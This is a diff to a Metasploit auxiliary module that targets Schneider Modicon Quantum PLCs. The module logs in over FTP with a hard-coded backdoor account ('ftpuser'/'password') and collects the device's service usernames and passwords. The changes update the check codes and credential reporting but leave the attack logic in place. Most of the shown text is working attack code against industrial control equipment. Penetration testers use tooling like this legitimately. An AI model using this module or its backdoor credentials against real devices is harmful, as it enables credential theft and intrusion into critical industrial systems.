@@ -1,11 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Report
 
@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(21),
         OptString.new('FTPUSER', [true, "The backdoor account to use for login", 'ftpuser']),
-        OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password']),
+        OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password'])
       ], self.class)
 
     register_advanced_options(
@@ -59,7 +59,6 @@ class Metasploit3 < Msf::Auxiliary
   # device, then we're going to end up storing HTTP credentials that are not
   # correct. If there's a way to fingerprint the device, it should be done here.
   def check
-    return true unless datastore['RUN_CHECK']
     is_modicon = false
     vprint_status "#{ip}:#{rport} - FTP - Checking fingerprint"
     connect rescue nil
@@ -68,37 +67,68 @@ class Metasploit3 < Msf::Auxiliary
       is_modicon = check_banner()
       disconnect
     else
-      print_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
-      return false
+      vprint_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
+      return Exploit::CheckCode::Unknown
     end
+
     if is_modicon
-      print_status "#{ip}:#{rport} - FTP - Matches Modicon fingerprint"
+      vprint_status "#{ip}:#{rport} - FTP - Matches Modicon fingerprint"
+      return Exploit::CheckCode::Detected
     else
-      print_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
+      vprint_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
     end
-    return is_modicon
+
+    return Exploit::CheckCode::Safe
   end
 
   def run
-    if check()
-      if setup_ftp_connection()
-        grab()
-      end
+    if datastore['RUN_CHECK'] and check == Exploit::CheckCode::Detected
+      print_status("Service detected.")
+      grab() if setup_ftp_connection()
+    else
+      grab() if setup_ftp_connection()
     end
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def setup_ftp_connection
     vprint_status "#{ip}:#{rport} - FTP - Connecting"
-    if connect_login()
+    conn = connect_login
+    if conn
       print_status("#{ip}:#{rport} - FTP - Login succeeded")
-      report_auth_info(
-        :host => ip,
-        :port => rport,
-        :proto => 'tcp',
-        :user => user,
-        :pass => pass,
-        :ptype => 'password_ro',
-        :active => true
+      report_cred(
+        ip: ip,
+        port: rport,
+        user: user,
+        password: pass,
+        service_name: 'modicon',
+        proof: "connect_login: #{conn}"
       )
       return true
     else
@@ -120,7 +150,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def grab
-    logins = Rex::Ui::Text::Table.new(
+    logins = Rex::Text::Table.new(
       'Header'	=>	"Schneider Modicon Quantum services, usernames, and passwords",
       'Indent'	=>	1,
       'Columns'	=>	["Service", "User Name", "Password"]
